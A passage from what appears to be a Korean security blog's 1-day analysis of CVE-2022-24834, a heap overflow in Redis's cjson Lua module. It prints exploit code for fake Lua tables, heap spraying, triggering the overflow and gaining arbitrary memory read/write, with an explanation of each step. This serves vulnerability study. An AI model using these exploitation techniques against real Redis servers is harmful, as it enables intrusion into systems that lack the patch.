class="hljs-meta-keyword">define</span> LUA_TTHREAD8</span></code></pre><p>&#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC5D0; &#xC0AC;&#xC6A9;&#xB418;&#xB294; <code>Table</code>&#xC758; &#xC815;&#xC758;&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;</p><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Table</span> {</span>   CommonHeader;   <span class="hljs-comment">/*</span><span class="hljs-comment">      GCObject *next;</span><span class="hljs-comment">      lu_byte tt;</span><span class="hljs-comment">      lu_byte marked;</span><span class="hljs-comment">   */</span>   lu_byte flags;  <span class="hljs-comment">/* 1&lt;&lt;p means tagmethod(p) is not present */</span>   <span class="hljs-keyword">int</span> readonly;   lu_byte lsizenode;  <span class="hljs-comment">/* log2 of size of `node&apos; array */</span>   <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Table</span> *<span class="hljs-title">metatable</span>;</span>   TValue *<span class="hljs-built_in">array</span>;  <span class="hljs-comment">/* array part, offset: 0x20 */</span>   Node *node;   Node *lastfree;  <span class="hljs-comment">/* any free position is before this position */</span>   GCObject *gclist;   <span class="hljs-keyword">int</span> sizearray;  <span class="hljs-comment">/* size of `array&apos; array, offset: 0x40 */</span>} Table;</code></pre><p>Lua&#xC5D0;&#xC11C; <code>local t = {}</code>&#xC640; &#xAC19;&#xC774; &#xD14C;&#xC774;&#xBE14;&#xC744; &#xC0DD;&#xC131;&#xD558;&#xBA74; <code>Table</code> &#xAD6C;&#xC870;&#xCCB4;&#xC640; &#xD14C;&#xC774;&#xBE14;&#xC5D0; &#xC800;&#xC7A5;&#xB41C; &#xC624;&#xBE0C;&#xC81D;&#xD2B8;&#xB97C; &#xAC00;&#xB9AC;&#xD0AC; <code>TValue</code> &#xBC30;&#xC5F4;&#xC774; &#xD799;&#xC5D0; &#xD560;&#xB2F9;&#xB418;&#xACE0; <code>TValue</code> &#xBC30;&#xC5F4;&#xC744; <code>Table</code>&#xC758;  <code>array</code> &#xD544;&#xB4DC;&#xAC00; &#xAC00;&#xB9AC;&#xCF1C; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC740; &#xD615;&#xD0DC;&#xAC00; &#xB429;&#xB2C8;&#xB2E4;.</p><p><img src="/2024/08/18/pwndorei/1day1document_CVE-2022-24834/Untitled.png" alt="Untitled"></p><blockquote><p>&#xADF8;&#xB9BC;.1 <a href="https://ricercasecurity.blogspot.com/2023/07/fuzzing-farm-4-hunting-and-exploiting-0.html">&#xCD9C;&#xCC98;</a></p></blockquote><p>Overflow&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xBC84;&#xD37C;&#xBCF4;&#xB2E4; &#xB192;&#xC740; &#xC8FC;&#xC18C;&#xC5D0; &#xD560;&#xB2F9;&#xB41C; <code>Table</code>&#xC758; <code>array</code>&#xB97C; Partial Overwrite&#xD558;&#xC5EC; LSB&#xB97C; <code>&quot;</code>(0x22)&#xB85C; &#xBCC0;&#xD658;&#xD558;&#xBA74; &#xC2E4;&#xC81C; &#xBC30;&#xC5F4;&#xACFC; &#xAC00;&#xAE4C;&#xC6B4; &#xB2E4;&#xB978; &#xC8FC;&#xC18C;&#xB97C; &#xAC00;&#xB9AC;&#xD0A4;&#xAC8C; &#xB9CC;&#xB4E4; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xC8FC;&#xC18C;&#xC5D0; &#xC0AC;&#xC804;&#xC5D0; &#xAC00;&#xC9DC; &#xBC30;&#xC5F4;(fake array)&#xB97C; &#xAD6C;&#xC131;&#xD574;&#xB454;&#xB2E4;&#xBA74; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; Fake Object&#xC5D0; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2024/08/18/pwndorei/1day1document_CVE-2022-24834/Untitled%201.png" alt="Untitled"></p><blockquote><p>&#xADF8;&#xB9BC;.2 <a href="https://ricercasecurity.blogspot.com/2023/07/fuzzing-farm-4-hunting-and-exploiting-0.html">&#xCD9C;&#xCC98;</a></p></blockquote><h3 id="2-Fake-Table"><a href="#2-Fake-Table" class="headerlink" title="2. Fake Table"></a>2. Fake Table</h3><p>&#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787; &#xCF54;&#xB4DC;&#xC5D0;&#xC11C;&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; &#xC870;&#xC791;&#xB41C; <code>array</code>&#xAC00; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; &#xBC30;&#xC5F4;&#xC758; &#xCCAB; &#xBC88;&#xC9F8; &#xC6D0;&#xC18C;&#xB85C; &#xC0AC;&#xC6A9;&#xB420; Fake Table&#xC744; &#xAD6C;&#xC131;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs lua"><span class="hljs-keyword">local</span> heap_addr_leaker = {}<span class="hljs-keyword">local</span> fake_array_base = addrof(heap_addr_leaker)...<span class="hljs-keyword">local</span> fake_table_template = ( <span class="hljs-comment">-- TString</span><span class="hljs-comment">-- TString -&gt; 0x18 bytes</span>   <span class="hljs-comment">-- typedef union TString {</span>      <span class="hljs-comment">-- L_Umaxalign dummy;  /* ensures maximum alignment for strings */</span>      <span class="hljs-comment">-- struct {</span>         <span class="hljs-comment">-- CommonHeader;</span>         <span class="hljs-comment">-- lu_byte reserved;</span>         <span class="hljs-comment">-- unsigned int hash;</span>         <span class="hljs-comment">-- size_t len;</span>      <span class="hljs-comment">-- } tsv;</span>   <span class="hljs-comment">-- } TString;</span>   <span class="hljs-string">&quot;SSSSSSSSFF&quot;</span> <span class="hljs-comment">-- (pad for address 0xXXXXXX2&apos;2&apos;) -- start from offset 0x18, until 0x22</span>   .. <span class="hljs-string">&quot;\000\000\000\000\000\000\000\000&quot;</span> <span class="hljs-comment">-- *next</span>   .. <span class="hljs-string">&quot;\005&quot;</span> <span class="hljs-comment">-- tt (LUA_TTABLE)</span>   .. <span class="hljs-string">&quot;\001&quot;</span> <span class="hljs-comment">-- marked</span>   .. <span class="hljs-string">&quot;\000&quot;</span> <span class="hljs-comment">-- flags</span>   .. <span class="hljs-string">&quot;\000\000\000\000\000&quot;</span> <span class="hljs-comment">-- ~ int readonly</span>   .. <span class="hljs-string">&quot;\000\000\000\000\000\000\000\000&quot;</span> <span class="hljs-comment">-- _padding_ for  lu_byte lsizenode</span>   .. <span class="hljs-string">&quot;\000\000\000\000\000\000\000\000&quot;</span> <span class="hljs-comment">-- *metatable</span>   .. p64(fake_array_base) <span class="hljs-comment">-- *array --&gt; low heap address</span>   .. <span class="hljs-string">&quot;\000\000\000\000\000\000\000\000&quot;</span> <span class="hljs-comment">-- *node</span>   .. <span class="hljs-string">&quot;\000\000\000\000\000\000\000\000&quot;</span> <span class="hljs-comment">-- *lastfree</span>   .. <span class="hljs-string">&quot;\000\000\000\000\000\000\000\000&quot;</span> <span class="hljs-comment">-- *gclist</span>   .. <span class="hljs-string">&quot;\255\255\255\127\000\000\000\000&quot;</span> <span class="hljs-comment">-- sizearray</span>)...</code></pre><p>&#xC774;&#xB807;&#xAC8C; &#xAD6C;&#xC131;&#xB41C; Fake Table&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xBA74; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; Fake Table&#xC758; <code>array</code> &#xAC00; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; &#xD799;&#xC758; &#xB0AE;&#xC740; &#xC8FC;&#xC18C;&#xBD80;&#xD130; Fake Array&#xAC00; &#xD615;&#xC131;&#xB418;&#xACE0; Fake Table&#xC758; <code>sizearray</code> &#xAC00; <code>int</code> &#xC790;&#xB8CC;&#xD615; &#xCD5C;&#xB313;&#xAC12;&#xC778; 0x7fffffff&#xB85C; &#xC124;&#xC815;&#xB418;&#xC5B4; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC804;&#xCCB4; &#xD799; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. <a href="https://hackyboiz.github.io/2024/08/04/pwndorei/1day1document_CVE-2023-21608/#1-Create-Corrupted-ArrayBuffer">CVE-2023-21608&#xC758; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;</a>&#xC5D0;&#xC11C; <code>ArrayBuffer</code>&#xC758; size &#xD544;&#xB4DC;&#xB97C; &#xC870;&#xC791;&#xD574;&#xC11C; OOB access&#xC5D0; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xAC83;&#xACFC; &#xB3D9;&#xC77C;&#xD55C; &#xC6A9;&#xB3C4;&#xC778; &#xAC70;&#xC8E0;!&#x2026;</p><p><img src="/2024/08/18/pwndorei/1day1document_CVE-2022-24834/Untitled%202.png" alt="Untitled"></p><blockquote><p>&#xADF8;&#xB9BC;.3 <a href="https://ricercasecurity.blogspot.com/2023/07/fuzzing-farm-4-hunting-and-exploiting-0.html">&#xCD9C;&#xCC98;</a></p></blockquote><p> Lua&#xC5D0;&#xC11C;&#xB294; <code>Table</code> &#xB4F1;&#xC758; &#xC624;&#xBE0C;&#xC81D;&#xD2B8;&#xB97C; &#xC778;&#xC790;&#xB85C; <code>tostring</code> &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xBA74; &#xC624;&#xBE0C;&#xC81D;&#xD2B8;&#xAC00; &#xD560;&#xB2F9;&#xB41C; &#xD799;&#xC758; &#xC8FC;&#xC18C;&#xAC00; &#xD3EC;&#xD568;&#xB41C; &#xBB38;&#xC790;&#xC5F4;&#xC774; &#xBC18;&#xD658;&#xB429;&#xB2C8;&#xB2E4;. <code>addrof</code> &#xD568;&#xC218;&#xC5D0;&#xC11C;&#xB294; &#xC774;&#xB97C; &#xC774;&#xC6A9;&#xD558;&#xC5EC; &#xC624;&#xBE0C;&#xC81D;&#xD2B8;&#xC758; &#xC8FC;&#xC18C;&#xB97C; &#xAC00;&#xC838;&#xC624;&#xACE0; &#xC774;&#xB97C; &#xD1B5;&#xD574; &#xD799;&#xC5D0; &#xC801;&#xC6A9;&#xB41C; ASLR&#xC744; &#xC6B0;&#xD68C;&#xD558;&#xACE0; Fake Array&#xC758; &#xC2DC;&#xC791; &#xC8FC;&#xC18C;&#xC778; <code>fake_array_base</code>&#xB97C; &#xC124;&#xC815;&#xD569;&#xB2C8;&#xB2E4;.</p><h3 id="3-Heap-Feng-Shui-amp-Spary"><a href="#3-Heap-Feng-Shui-amp-Spary" class="headerlink" title="3. Heap Feng-Shui &amp; Spary"></a>3. Heap Feng-Shui &amp; Spary</h3><p>&#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787; &#xCF54;&#xB4DC;&#xC5D0;&#xC11C;&#xB294; &#xADF8;&#xB9BC;.2&#xC640; &#xAC19;&#xC740; &#xBA54;&#xBAA8;&#xB9AC; &#xAD6C;&#xC131;&#xC744; &#xB9CC;&#xB4E4;&#xAE30; &#xC704;&#xD574; Heap Spary&#xB97C; &#xC9C4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs lua"><span class="hljs-keyword">local</span> fakes_s = {}<span class="hljs-keyword">local</span> fakes_t = {}<span class="hljs-keyword">local</span> fakes_num = <span class="hljs-number">100</span><span class="hljs-keyword">for</span> i=<span class="hljs-number">1</span>,fakes_num <span class="hljs-keyword">do</span>   fakes_s[i] = <span class="hljs-number">0</span>   fakes_t[i] = <span class="hljs-number">0</span><span class="hljs-keyword">end</span><span class="hljs-keyword">for</span> i=<span class="hljs-number">1</span>,fakes_num <span class="hljs-keyword">do</span>   fakes_s[i] = fake_table_template .. number_strings[i]   fakes_t[i] = {}<span class="hljs-keyword">end</span><span class="hljs-keyword">local</span> target_ptr = <span class="hljs-literal">nil</span><span class="hljs-keyword">for</span> i=fakes_num,<span class="hljs-number">1</span>,<span class="hljs-number">-1</span> <span class="hljs-keyword">do</span>   <span class="hljs-comment">-- 0xXXXX22 fake table</span>   <span class="hljs-comment">-- 0xXXXX80 table</span>   <span class="hljs-comment">-- Note: Difference of addresses depends on #fakes_s[i]. DO NOT change the length</span>   <span class="hljs-keyword">if</span> <span class="hljs-built_in">tostring</span>(fakes_t[i]):<span class="hljs-built_in">sub</span>(<span class="hljs-number">-2</span>) == <span class="hljs-string">&quot;80&quot;</span> <span class="hljs-keyword">then</span>      target_ptr = fakes_t[i]      <span class="hljs-keyword">break</span>   <span class="hljs-keyword">end</span><span class="hljs-keyword">end</span></code></pre><p><code>fakes_s</code> &#xC5D0;&#xB294; Fake Table&#xC744; &#xAD6C;&#xC131;&#xD558;&#xACE0; <code>fakes_t</code>&#xC5D0;&#xB294; &#xC77C;&#xBC18;&#xC801;&#xC778; <code>Table</code>&#xC744; &#xAD6C;&#xC131;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xBC88;&#xAC08;&#xC544; Spary&#xB97C; &#xC9C4;&#xD589;&#xD558;&#xBA74; <code>fakes_t[i]</code>&#xC5D0; &#xC800;&#xC7A5;&#xB41C; <code>Table</code>&#xC758; <code>array</code> &#xC8FC;&#xC18C;&#xAC00; 0xXXXX80&#xC77C; &#xB54C; 0xXXXX22&#xC758; &#xC8FC;&#xC18C;&#xC5D0; Fake Table&#xC774; &#xD615;&#xC131;&#xB429;&#xB2C8;&#xB2E4;. &#xC774;&#xB7EC;&#xD55C; &#xC870;&#xAC74;&#xC5D0; &#xB9DE;&#xB294; <code>fakes_t[i]</code>&#xB97C; <code>target_ptr</code>&#xC5D0; &#xC800;&#xC7A5;&#xD558;&#xACE0; Partial Overwrite&#xC758; &#xD0C0;&#xAC9F;&#xC73C;&#xB85C; &#xC0BC;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xD6C4; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; <code>target_ptr</code>&#xC744; Spary&#xD558;&#xC5EC; Partial Overwrite &#xC131;&#xACF5; &#xD655;&#xB960;&#xC744; &#xB192;&#xC774;&#xB294;&#xB370; &#xC0AC;&#xC6A9;&#xD560; <code>spary_holder</code>&#xB97C; &#xCD08;&#xAE30;&#xD654;&#xD558;&#xACE0; &#xC774;&#xD6C4; &#xD560;&#xB2F9;&#xB418;&#xB294; &#xD799; &#xCCAD;&#xD06C;&#xAC00; &#xC5F0;&#xC18D;&#xC801;&#xC778; &#xC8FC;&#xC18C;&#xB97C; &#xAC16;&#xB3C4;&#xB85D; &#xB2E4;&#xC591;&#xD55C; &#xD06C;&#xAE30;&#xB85C; &#xC5EC;&#xB7EC; &#xBC88; &#xD560;&#xB2F9;&#xC744; &#xBC18;&#xBCF5;&#xD558;&#xC5EC; &#xBA54;&#xBAA8;&#xB9AC; &#xD560;&#xB2F9;&#xC790;&#xC758; free list&#xB97C; &#xBE44;&#xC6C1;&#xB2C8;&#xB2E4;.</p><p>Spray&#xB41C; &#xB370;&#xC774;&#xD130;&#xBCF4;&#xB2E4; Overflow&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xB294; encode &#xBC84;&#xD37C;&#xAC00; &#xB354; &#xB0AE;&#xC740; &#xC8FC;&#xC18C;&#xC5D0; &#xC704;&#xCE58;&#xD558;&#xB3C4;&#xB85D; <code>cjson.encode_keep_buffer(&apos;on&apos;)</code>&#xC744; &#xD638;&#xCD9C;&#xD558;&#xC5EC; &#xD560;&#xB2F9;&#xB41C; &#xBC84;&#xD37C;&#xAC00; &#xC7AC;&#xC0AC;&#xC6A9;&#xB418;&#xAC8C; &#xB9CC;&#xB4E4;&#xACE0; Corruption&#xC73C;&#xB85C; &#xC778;&#xD55C; &#xD06C;&#xB798;&#xC2DC;&#xB97C; &#xBC29;&#xC9C0;&#xD558;&#xAE30; &#xC704;&#xD574; &#xB300;&#xB7C9;&#xC758; dummy chunk&#xB97C; &#xD560;&#xB2F9;&#xD55C; &#xB2E4;&#xC74C; <code>target_ptr</code>&#xC744; Spray&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs lua"><span class="hljs-keyword">local</span> spray_holder = {}<span class="hljs-keyword">for</span> i=<span class="hljs-number">1</span>,<span class="hljs-number">128</span> <span class="hljs-keyword">do</span>   spray_holder[i] = {}<span class="hljs-keyword">end</span><span class="hljs-comment">-- error((&quot;spray_holder: %s&quot;):format(tostring(spray_holder)))</span><span class="hljs-comment">--</span><span class="hljs-comment">-- Flush allocator caches</span><span class="hljs-comment">--</span><span class="hljs-keyword">for</span> i=<span class="hljs-number">1</span>,<span class="hljs-number">0x42</span> <span class="hljs-keyword">do</span>   <span class="hljs-keyword">for</span> j=<span class="hljs-number">1</span>,<span class="hljs-number">200</span> <span class="hljs-keyword">do</span> <span class="hljs-comment">-- To increase reliability, make more iterations.</span>      refs[refs_i] = <span class="hljs-built_in">string</span>.<span class="hljs-built_in">sub</span>(string_source, <span class="hljs-number">8</span>*(j<span class="hljs-number">-1</span>)+<span class="hljs-number">1</span>, <span class="hljs-number">8</span>*(j<span class="hljs-number">-1</span>)+<span class="hljs-number">1</span> + <span class="hljs-built_in">math</span>.<span class="hljs-built_in">max</span>(<span class="hljs-number">0</span>, i*<span class="hljs-number">0x10</span> - string_overhead) - <span class="hljs-number">1</span>)      refs_i = refs_i + <span class="hljs-number">1</span>   <span class="hljs-keyword">end</span><span class="hljs-keyword">end</span><span class="hljs-keyword">for</span> i = <span class="hljs-number">1</span>, <span class="hljs-number">256</span> <span class="hljs-keyword">do</span>   refs[refs_i] = { string_source:<span class="hljs-built_in">byte</span>(<span class="hljs-number">1</span>, <span class="hljs-number">0x1000</span> - <span class="hljs-number">1</span> - <span class="hljs-number">5</span>) }   refs_i = refs_i + <span class="hljs-number">1</span><span class="hljs-keyword">end</span>cjson.encode_keep_buffer(<span class="hljs-string">&apos;on&apos;</span>)<span class="hljs-keyword">local</span> top = <span class="hljs-built_in">string</span>.<span class="hljs-built_in">sub</span>(string_source, <span class="hljs-number">0</span>, <span class="hljs-number">0x4000</span> - string_overhead - <span class="hljs-number">1</span>)<span class="hljs-keyword">local</span> result = cjson.encode(top) <span class="hljs-keyword">for</span> i = <span class="hljs-number">1</span>, n_expand <span class="hljs-keyword">do</span>   heap_expand[i] = { string_source:<span class="hljs-built_in">byte</span>(<span class="hljs-number">1</span>, <span class="hljs-number">0x1000</span> - <span class="hljs-number">1</span> - <span class="hljs-number">5</span>) }<span class="hljs-keyword">end</span><span class="hljs-keyword">for</span> i=<span class="hljs-number">1</span>,#spray_holder <span class="hljs-keyword">do</span>   spray_holder[i][<span class="hljs-number">1</span>] = target_ptr<span class="hljs-keyword">end</span></code></pre><p>Spary&#xAC00; &#xB05D;&#xB09C; &#xC2DC;&#xC810;&#xC5D0;&#xC11C;&#xC758; &#xD799;&#xC740; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC740; &#xC0C1;&#xD0DC;&#xAC00; &#xB429;&#xB2C8;&#xB2E4;</p><p><img src="/2024/08/18/pwndorei/1day1document_CVE-2022-24834/Untitled%203.png" alt="Untitled"></p><p><code>spray_holder[i][1] = target_ptr</code>&#xB97C; &#xBC18;&#xBCF5;&#xC801;&#xC73C;&#xB85C; &#xC218;&#xD589;&#xD558;&#xBA74;&#xC11C; target array&#xB97C; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; <code>Table</code>&#xC774; &#xB2E4;&#xC218; &#xD560;&#xB2F9;&#xB418;&#xACE0; &#xC774;&#xC911; &#xD558;&#xB098;&#xC758; <code>array</code> &#xD544;&#xB4DC;&#xB97C; Partial Overwrite&#xB85C; <code>Fake Table</code>&#xC744; &#xAC00;&#xB9AC;&#xD0A4;&#xAC8C; &#xB9CC;&#xB4E4; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="4-Heap-Overflow"><a href="#4-Heap-Overflow" class="headerlink" title="4. Heap Overflow"></a>4. Heap Overflow</h3><p>Spray&#xB97C; &#xC644;&#xB8CC;&#xD55C; &#xD6C4; <code>cjson.encode(evil)</code>&#xC744; &#xD638;&#xCD9C;&#xD558;&#xC5EC; Overflow&#xB97C; &#xD2B8;&#xB9AC;&#xAC70;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xD6C4; <code>spary_holder</code>&#xB97C; &#xC21C;&#xD68C;&#xD558;&#xBA74;&#xC11C; Partial Overwrite&#xB418;&#xC5B4; <code>array</code> &#xD544;&#xB4DC;&#xC758; LSB&#xAC00; 0x22&#xC778; &#xC624;&#xBE0C;&#xC81D;&#xD2B8;&#xB97C; <code>fake_array</code>&#xB85C; &#xAC00;&#xC838;&#xC635;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs lua"><span class="hljs-comment">--</span><span class="hljs-comment">-- Trigger vulnerability: Heap overflow on encode_buf</span><span class="hljs-comment">--</span>refs[refs_i] = cjson.encode(evil)refs_i = refs_i + <span class="hljs-number">1</span><span class="hljs-keyword">local</span> fake_array = <span class="hljs-literal">nil</span><span class="hljs-keyword">for</span> i=<span class="hljs-number">1</span>,#spray_holder <span class="hljs-keyword">do</span>   <span class="hljs-comment">-- spray_holder[i][1][1] = 0x1337</span>   <span class="hljs-keyword">local</span> obj = spray_holder[i][<span class="hljs-number">1</span>]   <span class="hljs-keyword">if</span> <span class="hljs-built_in">tostring</span>(obj):<span class="hljs-built_in">sub</span>(<span class="hljs-number">-2</span>) == <span class="hljs-string">&quot;22&quot;</span> <span class="hljs-keyword">then</span>      fake_array = obj      <span class="hljs-comment">-- error((&quot;found: %d&quot;):format(i))</span>      <span class="hljs-keyword">break</span>   <span class="hljs-keyword">end</span><span class="hljs-keyword">end</span><span class="hljs-keyword">if</span> fake_array == <span class="hljs-literal">nil</span> <span class="hljs-keyword">then</span>   <span class="hljs-built_in">error</span>(<span class="hljs-string">&quot;Bad luck...&quot;</span>)<span class="hljs-keyword">end</span></code></pre><h3 id="5-Arbitrary-Address-Read-Write"><a href="#5-Arbitrary-Address-Read-Write" class="headerlink" title="5. Arbitrary Address Read/Write"></a>5. Arbitrary Address Read/Write</h3><p><code>fake_array</code>&#xB97C; &#xD1B5;&#xD574; &#xB113;&#xC740; &#xD799; &#xC601;&#xC5ED;&#xC744; <code>TValue</code> &#xBC30;&#xC5F4;&#xCC98;&#xB7FC; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xAC8C; &#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. <code>fake_array[i]</code>&#xC640; &#xAC19;&#xC740; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xBC30;&#xC5F4;&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xC5EC; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC77D;&#xAC70;&#xB098; &#xC4F8; &#xACBD;&#xC6B0;, Lua&#xC758; &#xC778;&#xB371;&#xC2A4;&#xB294; 1&#xBD80;&#xD130; &#xC2DC;&#xC791;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; <code>array[i-1]</code>&#xC758; <code>Value</code>&#xC640; <code>tt</code>&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xC608;&#xB97C; &#xB4E4;&#xC5B4;, <code>fake_array[0x5] = 0</code>&#xC744; &#xC2E4;&#xD589;&#xD558;&#xBA74; <code>array[0x4].Value</code>&#xC5D0; 0&#xC774; &#xC4F0;&#xC774;&#xACE0; <code>array[0x4].tt</code>&#xC5D0;&#xB294; 3(<code>LUA_TNUMBER</code>)&#xAC00; &#xC4F0;&#xC774;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. &#xB370;&#xC774;&#xD130;&#xB97C; &#xC77D;&#xC744; &#xB54C;&#xB294; <code>tt</code>&#xB97C; &#xD1B5;&#xD574; &#xD0C0;&#xC785;&#xC744; &#xC2DD;&#xBCC4;&#xD558;&#xACE0; &#xD0C0;&#xC785;&#xC5D0; &#xB530;&#xB77C; &#xC801;&#xC808;&#xD55C; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC77D;&#xC5B4; &#xBC18;&#xD658;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. <code>TValue</code>&#xAC00; 0x10 &#xD06C;&#xAE30;&#xC758; &#xAD6C;&#xC870;&#xCCB4;&#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC4F8; &#xC218; &#xC788;&#xB294; &#xC8FC;&#xC18C;&#xB294; 0x0&#xC73C;&#xB85C; &#xB05D;&#xB098;&#xB294; &#xC8FC;&#xC18C;&#xB85C; &#xC81C;&#xD55C;&#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xC880; &#xB354; &#xC790;&#xC720;&#xB85C;&#xC6B4; &#xC784;&#xC758; &#xC8FC;&#xC18C; &#xC77D;&#xAE30;/&#xC4F0;&#xAE30;&#xB97C; &#xC218;&#xD589;&#xD558;&#xAE30; &#xC704;&#xD574; <code>fake_array</code>&#xB97C; &#xD1B5;&#xD574; &#xCD94;&#xAC00;&#xC801;&#xC778; Fake Table&#xC744; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787; &#xCF54;&#xB4DC;&#xC5D0;&#xC11C;&#xB294; &#xC544;&#xB798;&#xCC98;&#xB7FC; &#xC0C8;&#xB85C;&#xC6B4; Fake Table&#xC744; &#xAD6C;&#xC131;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs lua"><span class="hljs-comment">-- overwrite array pointer</span><span class="hljs-keyword">local</span> ofs = <span class="hljs-built_in">math</span>.<span class="hljs-built_in">floor</span>((owow_array1_addr + <span class="hljs-number">0x20</span> - fake_array_base) / <span class="hljs-number">0x10</span>)fake_array[<span class="hljs-number">1</span> + ofs] = struct.<span class="hljs-built_in">unpack</span>(<span class="hljs-string">&apos;d&apos;</span>, p64(fake_array_base - <span class="hljs-number">8</span>))<span class="hljs-comment">-- overwrite node pointer to NULL</span><span class="hljs-keyword">local</span> ofs = <span class="hljs-built_in">math</span>.<span class="hljs-built_in">floor</span>((owow_array1_addr + <span class="hljs-number">0x28</span> - (fake_array_base<span class="hljs-number">-8</span>)) / <span class="hljs-number">0x10</span>)owow_array1[<span class="hljs-number">1</span> + ofs] = <span class="hljs-number">0</span><span class="hljs-comment">-- overwrite size</span><span class="hljs-keyword">local</span> ofs = <span class="hljs-built_in">math</span>.<span class="hljs-built_in">floor</span>((owow_array1_addr + <span class="hljs-number">0x40</span> - fake_array_base) / <span class="hljs-number">0x10</span>)fake_array[<span class="hljs-number">1</span> + ofs] = bytes_to_double(<span class="hljs-string">&quot;\255\255\255\127\000\000\000\000&quot;</span>)</code></pre><p><code>owow_array1</code>&#xC740; &#xC0AC;&#xC804;&#xC5D0; &#xC0DD;&#xC131;&#xB41C; <code>fake_array_base</code> &#xBCF4;&#xB2E4; &#xB192;&#xC740; &#xC8FC;&#xC18C;&#xC5D0; &#xD560;&#xB2F9;&#xB41C; <code>Table</code>&#xC774;&#xACE0; <code>owow_array1_addr</code>&#xC740; &#xC774; <code>Table</code>&#xC758; &#xC8FC;&#xC18C;&#xB97C; &#xAC00;&#xB9AC;&#xD0B5;&#xB2C8;&#xB2E4;.</p><p>&#xBA3C;&#xC800; <code>local ofs = math.floor((owow_array1_addr + 0x20 - fake_array_base) / 0x10)</code>&#xAC00; &#xC2E4;&#xD589;&#xB418;&#xC5B4; <code>fake_array</code>&#xB97C; &#xD1B5;&#xD574; <code>owow_array1</code>&#xC758; <code>array</code> &#xD544;&#xB4DC;&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xAE30; &#xC704;&#xD55C; &#xC778;&#xB371;&#xC2A4;&#xB97C; &#xACC4;&#xC0B0;&#xD569;&#xB2C8;&#xB2E4;. <code>ofs</code>&#xB294; &#xC77D;&#xAC70;&#xB098; &#xC4F8; &#xC8FC;&#xC18C;&#xAC12;&#xC5D0;&#xC11C; Fake Table&#xC758; <code>array</code>&#xAC00; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; &#xC8FC;&#xC18C;&#xAC12;&#xC744; &#xBE80; &#xB2E4;&#xC74C; &#xC774;&#xB97C; 0x10&#xC73C;&#xB85C; &#xB098;&#xB204;&#xC5B4; &#xACC4;&#xC0B0;&#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xD6C4; &#xACC4;&#xC0B0;&#xB41C; <code>ofs</code>&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; <code>array</code> &#xD544;&#xB4DC;&#xB97C; <code>fake_array_base-8</code>&#xB85C; &#xC870;&#xC791;&#xD558;&#xBA74; <code>owow_array1</code>&#xC744; &#xD1B5;&#xD574; 0x8&#xB85C; &#xB05D;&#xB098;&#xB294; &#xC8FC;&#xC18C;&#xC5D0;&#xB3C4; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC4F8; &#xC218; &#xC788;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. &#xC774; &#xACFC;&#xC815;&#xC5D0;&#xC11C; <code>array</code> &#xD544;&#xB4DC;&#xAC00; <code>TValue.Value</code>&#xB85C; &#xD574;&#xC11D;&#xB418;&#xC5B4; <code>fake_array_base - 8</code>&#xC774; &#xC4F0;&#xC774;&#xACE0;, &#xC778;&#xC811;&#xD55C; 